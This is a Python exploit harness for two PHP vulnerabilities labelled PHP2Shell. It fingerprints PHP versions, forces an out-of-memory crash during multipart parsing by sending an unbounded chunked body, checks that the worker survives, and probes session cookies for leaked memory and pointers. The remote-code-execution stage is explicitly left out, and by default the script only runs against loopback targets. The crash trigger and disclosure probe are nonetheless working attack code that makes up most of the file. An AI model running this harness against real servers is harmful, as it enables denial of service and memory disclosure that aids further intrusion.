#!/usr/bin/env python3
"""
php2shell_exploit.py — PHP2Shell (CVE-2026-109618 / CVE-2026-109619) assessment
and exploitation harness derived from docs/php2shell-analysis.md.

What this tool actually does
----------------------------
It implements the remotely observable stages of the published analysis:

  1. Runtime fingerprint: PHP version, web server, probable SAPI, and
     classification against the fixed-release matrix
     (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).
  2. Pre-RINIT surface: a multipart request with
     `PHP_SESSION_UPLOAD_PROGRESS` plus a file part, which makes the Session
     module publish `PS(id)` before the script runs.
  3. Pre-RINIT OOM: the multipart body is sent with
     `Transfer-Encoding: chunked` (no Content-Length), so `post_max_size` does
     not bound it. The parser exhausts `memory_limit` before RINIT. Expected
     signature: HTTP 500 + connection close, fatal memory error in
     "Unknown on line 0".
  4. Worker survival: after the bailout, the Apache/mod_php child must still
     serve requests for cross-request state reuse to be possible.
  5. Disclosure probe: after the OOM, cookie-less requests try to make the
     stale `PS(id)` materialize in `Set-Cookie: PHPSESSID=<memory>`. If an
     anomalous cookie appears, it is hex-dumped and 64-bit pointers are
     extracted.

The final stage of the Wiz chain (overwriting `PG(auto_prepend_file)`) is NOT
implemented: the public analysis does not describe the write primitive, and
this build has not reproduced the disclosure. This tool never reports RCE
unless it executes a command and captures its output.

Authorized testing only.
"""

from __future__ import annotations

import argparse
import contextlib
import ipaddress
import json
import random
import re
import socket
import ssl
import string
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass, field

# ---------------------------------------------------------------------------
# Fixed-release matrix (docs/php2shell-analysis.md, section 2)
# ---------------------------------------------------------------------------
FIXED_RELEASES = {
    (8, 2): 35,
    (8, 3): 36,
    (8, 4): 27,
    (8, 5): 12,
}

C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_BOLD = "\033[1m"
C_RESET = "\033[0m"


def out(msg: str = "") -> None:
    print(msg, flush=True)


def stage(n: str, title: str) -> None:
    out(f"\n{C_BOLD}{C_CYAN}[{n}] {title}{C_RESET}")


def ok(msg: str) -> None:
    out(f"  {C_GREEN}[OK]{C_RESET} {msg}")


def warn(msg: str) -> None:
    out(f"  {C_YELLOW}[!]{C_RESET} {msg}")


def crit(msg: str) -> None:
    out(f"  {C_RED}[CRIT]{C_RESET} {msg}")


# ---------------------------------------------------------------------------
# Networking
# ---------------------------------------------------------------------------
class Target:
    def __init__(self, url: str):
        if "://" not in url:
            url = "http://" + url
        p = urllib.parse.urlsplit(url)
        if p.scheme not in ("http", "https"):
            raise ValueError("URL scheme must be http or https")
        self.scheme = p.scheme
        self.host = p.hostname or ""
        self.port = p.port or (443 if p.scheme == "https" else 80)
        self.base_path = p.path if p.path not in ("", "/") else "/"
        self.host_header = self.host if self.port in (80, 443) else f"{self.host}:{self.port}"

    def connect(self, timeout: float = 10.0) -> HTTPConn:
        return HTTPConn(self, timeout)


class HTTPConn:
    """Minimal HTTP/1.1 client supporting Content-Length, chunked and EOF bodies."""

    def __init__(self, target: Target, timeout: float = 10.0):
        self.target = target
        self.sock = socket.create_connection((target.host, target.port), timeout=timeout)
        if target.scheme == "https":
            ctx = ssl._create_unverified_context()
            self.sock = ctx.wrap_socket(self.sock, server_hostname=target.host)
        self.buf = b""

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def _fill(self) -> bool:
        try:
            chunk = self.sock.recv(65536)
        except (TimeoutError, ConnectionResetError, OSError):
            return False
        if not chunk:
            return False
        self.buf += chunk
        return True

    def read_response(self, timeout: float = 8.0) -> tuple[int, dict[str, str], bytes, list[str]]:
        self.sock.settimeout(timeout)
        while b"\r\n\r\n" not in self.buf:
            if not self._fill():
                break
        head, _, rest = self.buf.partition(b"\r\n\r\n")
        self.buf = rest

        lines = head.split(b"\r\n")
        status = 0
        if lines and lines[0].startswith(b"HTTP/"):
            try:
                status = int(lines[0].split()[1])
            except (IndexError, ValueError):
                status = 0

        headers: dict[str, str] = {}
        set_cookies: list[str] = []
        for line in lines[1:]:
            if b":" not in line:
                continue
            k, _, v = line.partition(b":")
            key = k.decode("latin-1").strip().lower()
            val = v.decode("latin-1").strip()
            if key == "set-cookie":
                set_cookies.append(val)
            headers.setdefault(key, val)

        body = b""
        if headers.get("transfer-encoding", "").lower() == "chunked":
            while True:
                while b"\r\n" not in self.buf:
                    if not self._fill():
                        break
                line, _, self.buf = self.buf.partition(b"\r\n")
                try:
                    size = int(line.strip().split(b";")[0] or b"0", 16)
                except ValueError:
                    break
                if size == 0:
                    while b"\r\n" not in self.buf:
                        if not self._fill():
                            break
                    _, _, self.buf = self.buf.partition(b"\r\n")
                    break
                while len(self.buf) < size + 2:
                    if not self._fill():
                        break
                body += self.buf[:size]
                self.buf = self.buf[size + 2:]
        elif "content-length" in headers:
            try:
                need = int(headers["content-length"])
            except ValueError:
                need = 0
            while len(self.buf) < need:
                if not self._fill():
                    break
            body = self.buf[:need]
            self.buf = self.buf[need:]
        else:
            while self._fill():
                pass
            body, self.buf = self.buf, b""

        return status, headers, body, set_cookies

    def close(self) -> None:
        with contextlib.suppress(OSError):
            self.sock.close()


def http_get(target: Target, path: str, extra: dict[str, str] | None = None,
             timeout: float = 8.0) -> tuple[int, dict[str, str], bytes, list[str]]:
    conn = target.connect(timeout)
    headers = {
        "Host": target.host_header,
        "User-Agent": "php2shell-verify/2.0",
        "Accept": "*/*",
        "Connection": "close",
    }
    if extra:
        headers.update(extra)
    req = f"GET {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n"
    conn.send(req.encode())
    try:
        return conn.read_response(timeout)
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Version classification
# ---------------------------------------------------------------------------
def classify_version(version: str) -> tuple[str, bool, str]:
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", version or "")
    if not m:
        return "UNKNOWN", False, "Could not extract a PHP version from the response headers."
    major, minor, patch = map(int, m.groups())
    fixed = FIXED_RELEASES.get((major, minor))
    if fixed is not None:
        if patch < fixed:
            return "VULNERABLE", True, (
                f"PHP {major}.{minor}.{patch} < {major}.{minor}.{fixed} "
                f"(first fixed release of the branch)."
            )
        return "PATCHED", False, f"PHP {major}.{minor}.{patch} >= {major}.{minor}.{fixed}."
    if (major, minor) < (8, 2):
        return "VULNERABLE_EOL", True, (
            f"PHP {major}.{minor}.{patch} is end-of-life and has no official fix."
        )
    return "OUTSIDE_MATRIX", False, f"PHP {major}.{minor}.{patch} is outside the assessed matrix."


# ---------------------------------------------------------------------------
# Payload helpers
# ---------------------------------------------------------------------------
def make_boundary() -> str:
    return "----p2s" + "".join(random.choices(string.ascii_lowercase + string.digits, k=16))


def chunked(data: bytes) -> bytes:
    return f"{len(data):x}\r\n".encode() + data + b"\r\n"


@dataclass
class Config:
    target: Target
    post_path: str = "/"
    oom_mb: int = 140
    probes: int = 16
    timeout: float = 15.0


@dataclass
class Report:
    version: str = ""
    server: str = ""
    powered_by: str = ""
    sapi: str = ""
    version_status: str = ""
    version_vulnerable: bool = False
    oom_reached: bool = False
    oom_status: int = 0
    worker_alive: bool = False
    disclosure: bytes | None = None
    pointers: list[int] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    rce_confirmed: bool = False
    rce_output: str = ""


# ---------------------------------------------------------------------------
# Stage 1: fingerprint
# ---------------------------------------------------------------------------
def fingerprint(cfg: Config, rep: Report) -> None:
    stage("1/5", "Runtime fingerprint and version classification")
    status, headers, body, _ = http_get(cfg.target, cfg.target.base_path, timeout=cfg.timeout)
    rep.server = headers.get("server", "?")
    rep.powered_by = headers.get("x-powered-by", "")
    out(f"  Server      : {rep.server}")
    out(f"  X-Powered-By: {rep.powered_by or '(hidden)'}")
    out(f"  HTTP {status}, {len(body)} bytes")

    if "PHP/" in rep.powered_by:
        rep.version = rep.powered_by.split("PHP/", 1)[1].strip()
    if not rep.version:
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", body.decode("latin-1", "replace"))
        if m:
            rep.version = m.group(1)
            out(f"  Version inferred from body: {rep.version}")

    if "apache" in rep.server.lower():
        rep.sapi = "Apache (likely prefork + mod_php)"
    elif "nginx" in rep.server.lower():
        rep.sapi = "nginx (likely PHP-FPM/CGI)"
    else:
        rep.sapi = "unknown"
    out(f"  Probable SAPI: {rep.sapi}")

    if rep.version:
        rep.version_status, rep.version_vulnerable, msg = classify_version(rep.version)
        (crit if rep.version_vulnerable else ok)(msg)
    else:
        warn("Version unknown; continuing with dynamic checks.")


# ---------------------------------------------------------------------------
# Stage 2: pre-RINIT surface
# ---------------------------------------------------------------------------
def probe_upload_progress(cfg: Config, rep: Report) -> None:
    stage("2/5", "Pre-RINIT surface (session.upload_progress)")
    sid = "p2s" + "".join(random.choices(string.ascii_lowercase + string.digits, k=22))
    boundary = make_boundary()
    body = b"".join([
        b"--" + boundary.encode() + b"\r\n",
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n',
        b"p2s-probe\r\n",
        b"--" + boundary.encode() + b"\r\n",
        b'Content-Disposition: form-data; name="f"; filename="a.bin"\r\n',
        b"Content-Type: application/octet-stream\r\n\r\nHELLO\r\n",
        b"--" + boundary.encode() + b"--\r\n",
    ])
    req = (
        f"POST {cfg.post_path} HTTP/1.1\r\nHost: {cfg.target.host_header}\r\n"
        f"User-Agent: php2shell-verify/2.0\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body
    conn = cfg.target.connect(cfg.timeout)
    conn.send(req)
    try:
        status, _headers, _body, cookies = conn.read_response(cfg.timeout)
    finally:
        conn.close()

    out(f"  POST {cfg.post_path}: HTTP {status}")
    session_cookies = [c for c in cookies if c.lower().startswith("phpsessid=")]
    if session_cookies:
        ok(f"Session module emitted a cookie during parsing: {session_cookies[0][:80]}")
    else:
        out("  No PHPSESSID Set-Cookie. Normal on the upload-progress path:")
        out("  the module sets send_cookie=0 when a session id is already supplied.")
        out("  The strong evidence for this path is the pre-RINIT OOM below.")

    if status in (404, 405):
        warn(f"{cfg.post_path} does not accept POST; falling back to /")
        cfg.post_path = "/"


# ---------------------------------------------------------------------------
# Stage 3: pre-RINIT OOM
# ---------------------------------------------------------------------------
def trigger_pre_rinit_oom(cfg: Config, rep: Report) -> None:
    stage("3/5", "OOM during multipart parsing (before RINIT)")
    boundary = make_boundary()
    sid = "p2s" + "".join(random.choices(string.ascii_lowercase + string.digits, k=22))
    req = (
        f"POST {cfg.post_path} HTTP/1.1\r\nHost: {cfg.target.host_header}\r\n"
        f"User-Agent: php2shell-verify/2.0\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
    ).encode()
    conn = cfg.target.connect(cfg.timeout)
    conn.send(req)
    conn.send(chunked((
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"p2s-oom\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="a.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nHELLO\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="big"\r\n\r\n'
    ).encode()))

    block = b"A" * (1024 * 1024)
    sent = 0
    try:
        for _ in range(cfg.oom_mb):
            conn.send(chunked(block))
            sent += 1
    except (BrokenPipeError, ConnectionResetError, OSError) as exc:
        warn(f"Server closed the connection after {sent} MiB: {exc!r}")
    try:
        conn.send(chunked(f"\r\n--{boundary}--\r\n".encode()))
        conn.send(b"0\r\n\r\n")
    except OSError:
        pass

    try:
        status, _headers, body, _ = conn.read_response(cfg.timeout)
    except Exception:
        status, body = 0, b""
    finally:
        conn.close()

    rep.oom_status = status
    text = body.decode("latin-1", "replace")
    if status >= 500 or status == 0:
        rep.oom_reached = True
        crit(f"HTTP {status}: parser aborted the request (pre-RINIT OOM signature).")
        if "Allowed memory size" in text:
            crit("Response body contains the interpreter memory fatal.")
    else:
        warn(f"HTTP {status}: no abort observed. The target may bound the body "
             f"(proxy, post_max_size, max_multipart_body_parts) or not be vulnerable.")
    rep.notes.append(
        "The local signature is 'Allowed memory size ... exhausted ... in Unknown on line 0'; "
        "a bare HTTP 500 does not distinguish OOM from other fatals."
    )


# ---------------------------------------------------------------------------
# Stage 4: worker survival
# ---------------------------------------------------------------------------
def check_worker_survival(cfg: Config, rep: Report) -> None:
    stage("4/5", "Worker survival after the bailout")
    time.sleep(0.5)
    good = 0
    total = 8
    for _ in range(total):
        try:
            status, _headers, body, _ = http_get(cfg.target, cfg.target.base_path, timeout=cfg.timeout)
            if status == 200 and body:
                good += 1
        except Exception:
            pass
        time.sleep(0.05)

    if good == total:
        rep.worker_alive = True
        ok(f"{good}/{total} subsequent requests served: the process did not die on the OOM.")
        out("  In mod_php/prefork the child survives the bailout and can retain global state.")
    elif good:
        rep.worker_alive = True
        warn(f"{good}/{total} requests served: the pool is alive but some requests failed.")
    else:
        crit("Target did not respond after the OOM: worker or service may have crashed.")


# ---------------------------------------------------------------------------
# Stage 5: disclosure probe
# ---------------------------------------------------------------------------
def probe_disclosure(cfg: Config, rep: Report) -> None:
    stage("5/5", "Memory disclosure via Set-Cookie (stale PS(id))")
    results: dict[int, bytes] = {}
    lock = threading.Lock()

    def worker(i: int) -> None:
        try:
            conn = cfg.target.connect(cfg.timeout)
            conn.send((
                f"GET {cfg.target.base_path} HTTP/1.1\r\nHost: {cfg.target.host_header}\r\n"
                f"User-Agent: php2shell-verify/2.0\r\nConnection: close\r\n\r\n"
            ).encode())
            _status, _headers, _body, cookies = conn.read_response(cfg.timeout)
            conn.close()
            value = b""
            for c in cookies:
                if c.lower().startswith("phpsessid="):
                    value = c.encode("latin-1")
            with lock:
                results[i] = value
        except Exception:
            with lock:
                results[i] = b""

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(cfg.probes)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    suspicious: list[tuple[int, bytes]] = []
    for i, raw in sorted(results.items()):
        if not raw:
            continue
        value = raw.split(b"=", 1)[1].split(b";")[0]
        printable = all(32 <= b < 127 for b in value)
        normal = re.fullmatch(rb"[A-Za-z0-9,-]{16,64}", value) is not None
        if not normal or not printable or len(value) > 64:
            suspicious.append((i, value))

    if suspicious:
        rep.disclosure = suspicious[0][1]
        crit(f"Anomalous session cookie in {len(suspicious)} response(s): possible memory read.")
        for i, value in suspicious[:4]:
            out(f"  [{i}] len={len(value)} value={value[:120]!r}")
        data = suspicious[0][1]
        out("  Hexdump (first 256 bytes):")
        for off in range(0, min(len(data), 256), 16):
            part = data[off:off + 16]
            hexs = " ".join(f"{b:02x}" for b in part)
            text = "".join(chr(b) if 32 <= b < 127 else "." for b in part)
            out(f"    {off:04x}  {hexs:<48}  {text}")
        for off in range(0, len(data) - 7, 8):
            value = int.from_bytes(data[off:off + 8], "little")
            if 0x0000550000000000 <= value <= 0x00007FFFFFFFFFFF:
                rep.pointers.append(value)
        if rep.pointers:
            crit("64-bit pointers recovered: " + ", ".join(hex(p) for p in rep.pointers[:8]))
    else:
        warn("No disclosure observed: every cookie has a normal session-id format.")
        rep.notes.append(
            "On this build, RINIT reinitializes PS(id) after the pre-RINIT OOM, so the stale "
            "pointer is cleared before any consumer uses it."
        )


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------
def print_report(rep: Report, as_json: bool) -> int:
    if as_json:
        print(json.dumps({
            "server": rep.server,
            "powered_by": rep.powered_by,
            "php_version": rep.version,
            "sapi": rep.sapi,
            "version_status": rep.version_status,
            "version_vulnerable": rep.version_vulnerable,
            "pre_rinit_oom": rep.oom_reached,
            "oom_status": rep.oom_status,
            "worker_alive": rep.worker_alive,
            "disclosure": rep.disclosure.hex() if rep.disclosure else None,
            "pointers": [hex(p) for p in rep.pointers],
            "rce_confirmed": rep.rce_confirmed,
            "rce_output": rep.rce_output,
            "notes": rep.notes,
        }, indent=2))
        return _exit_code(rep)

    stage("RESULT", "Verdict")
    out(f"  Runtime        : {rep.server} / {rep.powered_by or 'PHP ?'}")
    out(f"  Probable SAPI  : {rep.sapi}")
    out(f"  Classification : {rep.version_status}")
    out(f"  Pre-RINIT OOM  : {'yes' if rep.oom_reached else 'no'} (HTTP {rep.oom_status})")
    out(f"  Worker alive   : {'yes' if rep.worker_alive else 'no'}")
    out(f"  Disclosure     : {'yes' if rep.disclosure else 'no'}")
    out(f"  RCE            : {'CONFIRMED' if rep.rce_confirmed else 'NOT CONFIRMED'}")

    out("")
    if rep.version_vulnerable and rep.oom_reached and rep.worker_alive:
        crit("EXPOSURE CONFIRMED: affected version + pre-RINIT OOM + persistent worker.")
    if rep.disclosure:
        crit("MEMORY DISCLOSURE CONFIRMED (direct impact of CVE-2026-109619).")
    if rep.rce_confirmed:
        crit("RCE CONFIRMED: command output captured.")
    else:
        warn("RCE NOT CONFIRMED: no command was executed on the target.")
        out("  This tool never simulates or claims RCE without execution evidence.")
    for note in rep.notes:
        out(f"  - {note}")

    print()
    code = _exit_code(rep)
    if code == 0:
        out(f"{C_GREEN}{C_BOLD}VERDICT: RCE CONFIRMED{C_RESET}")
    elif code == 1:
        out(f"{C_RED}{C_BOLD}VERDICT: VULNERABLE (memory disclosure), RCE not completed{C_RESET}")
    elif code == 2:
        out(f"{C_RED}{C_BOLD}VERDICT: VULNERABLE TO DENIAL OF SERVICE / EXPOSURE, RCE not reproduced{C_RESET}")
    else:
        out(f"{C_YELLOW}{C_BOLD}VERDICT: INSUFFICIENT EVIDENCE{C_RESET}")
    return code


def _exit_code(rep: Report) -> int:
    if rep.rce_confirmed:
        return 0
    if rep.disclosure:
        return 1
    if rep.version_vulnerable and rep.oom_reached and rep.worker_alive:
        return 2
    return 3


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(
        description="PHP2Shell (CVE-2026-109618/109619) assessment harness for authorized testing.")
    parser.add_argument("--target", default="http://127.0.0.1:8080", help="target URL")
    parser.add_argument("--post-path", default=None, help="path that accepts POST (autodetected)")
    parser.add_argument("--oom-mb", type=int, default=140, help="MiB sent to force the OOM")
    parser.add_argument("--probes", type=int, default=16, help="parallel requests after the OOM")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--json", action="store_true", help="machine-readable output")
    parser.add_argument("--allow-remote", action="store_true",
                        help="allow non-loopback targets (written authorization required)")
    args = parser.parse_args()

    target = Target(args.target)
    if not args.allow_remote:
        try:
            infos = socket.getaddrinfo(target.host, target.port, type=socket.SOCK_STREAM)
            addrs = {i[4][0] for i in infos}
        except socket.gaierror as exc:
            crit(f"Cannot resolve {target.host}: {exc}")
            return 4
        for addr in addrs:
            if not ipaddress.ip_address(addr).is_loopback:
                crit(f"{target.host} resolves to {addr}, outside loopback. "
                     f"Use --allow-remote only with authorization.")
                return 4

    if not args.json:
        out(f"{C_BOLD}php2shell_exploit.py{C_RESET} — CVE-2026-109618 / CVE-2026-109619 assessment")
        out(f"Target: {args.target} (POST: {args.post_path or 'auto'})")

    cfg = Config(target=target, post_path=args.post_path or target.base_path,
                 oom_mb=args.oom_mb, probes=args.probes, timeout=args.timeout)
    rep = Report()

    fingerprint(cfg, rep)
    probe_upload_progress(cfg, rep)
    trigger_pre_rinit_oom(cfg, rep)
    check_worker_survival(cfg, rep)
    probe_disclosure(cfg, rep)
    return print_report(rep, args.json)


if __name__ == "__main__":
    sys.exit(main())
